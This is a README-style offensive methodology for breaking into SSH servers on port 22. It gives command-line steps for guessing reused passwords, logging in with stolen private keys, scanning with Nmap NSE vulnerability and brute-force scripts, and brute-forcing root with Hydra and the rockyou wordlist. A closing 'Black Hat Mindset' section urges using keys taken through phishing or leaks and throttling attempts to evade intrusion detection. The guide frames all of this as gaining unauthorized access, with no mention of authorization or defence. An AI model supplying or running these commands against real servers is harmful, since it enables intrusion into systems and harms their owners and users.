# Basic Methodology - Port 22 (SSH)

This README explores exploiting the Secure Shell (SSH) service on port 22, focusing on password reuse, private key logins, vulnerability scanning with Nmap NSE scripts, and brute-force attacks to gain unauthorized access.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Password Reuse](#password-reuse)
- [SSH Private Key Login](#ssh-private-key-login)
- [Nmap NSE Scripts](#nmap-nse-scripts)
- [Brute-Force Attacks](#brute-force-attacks)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

SSH on port 22 is a widely used protocol for secure remote access, but it can be a target for attackers if credentials are weak or private keys are exposed. This guide covers attempting logins with reused passwords, using stolen private keys, scanning for vulnerabilities, and brute-forcing credentials to compromise SSH servers.

## Setup and Prerequisites

- **Environment**: Linux host with network access to the target SSH server.
- **Tools**: Install `ssh` (e.g., `apt install openssh-client`), `nmap`, `hydra`, and ensure `chmod` is available.
- **Wordlists**: Prepare a password file (e.g., `password-file.txt`) or use `/usr/share/wordlists/rockyou.txt`.
- **IP Address**: Identify the target IP address (e.g., `<IP address>`).
- **Private Key**: Have a private key file (e.g., `private-key.txt`) if attempting key-based login.

## Password Reuse

Attempt SSH login using potentially reused passwords.

```bash
ssh <username>@<IP address>    # Connects to the SSH server at <IP address> as <username>. Enter a password when prompted (e.g., try admin, password, or other common credentials) (Linux).
```

Example:
```bash
ssh root@<IP address>    # Attempts to log in as root with a guessed password.
```

## SSH Private Key Login

Use a stolen or compromised private key to authenticate.

```bash
chmod 600 private-key.txt    # Sets the correct permissions (read/write for owner only) on the private key file to meet SSH requirements (Linux).

ssh -i private-key.txt <username>@<IP address>    # Authenticates to the SSH server using the private key file for <username> (Linux).
```

Example:
```bash
chmod 600 id_rsa
ssh -i id_rsa user@<IP address>    # Logs in as user with the id_rsa key.
```

## Nmap NSE Scripts

Scan for SSH vulnerabilities using Nmap's scripting engine.

```bash
ls -la /usr/share/nmap/scripts | grep "ssh"    # Lists SSH-related NSE scripts in the Nmap scripts directory (e.g., ssh-vuln-cve2018-15473.nse, ssh-brute.nse) to identify available options (Linux).
```

Example usage:
```bash
nmap -p 22 --script ssh-vuln* <IP address>    # Scans for known SSH vulnerabilities.
nmap -p 22 --script ssh-brute <IP address>    # Attempts to brute-force SSH credentials.
```

## Brute-Force Attacks

Guess SSH credentials using automated tools.

```bash
hydra -l root -P password-file.txt <IP address> ssh    # Uses hydra to brute-force the SSH server at <IP address> with username root and passwords from password-file.txt (Linux).
```

Alternative:
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt <IP address> ssh -t 4    # Limits to 4 threads to avoid triggering rate-limiting or account lockouts (Linux).
```

## Black Hat Mindset

- **Target Weak Credentials**: Test for reused or default passwords (e.g., `root:root`) to gain quick access.
- **Leverage Stolen Keys**: Use compromised private keys from phishing or data leaks to bypass password authentication.
- **Scan for Exploits**: Use Nmap NSE scripts to find unpatched vulnerabilities in the SSH service.
- **Stay Stealthy**: Limit brute-force attempts to avoid detection by rate-limiting or intrusion detection systems.

## Resources

- SSH Protocol
- Nmap NSE Documentation
- Hydra Manual
- SSH Security Guide

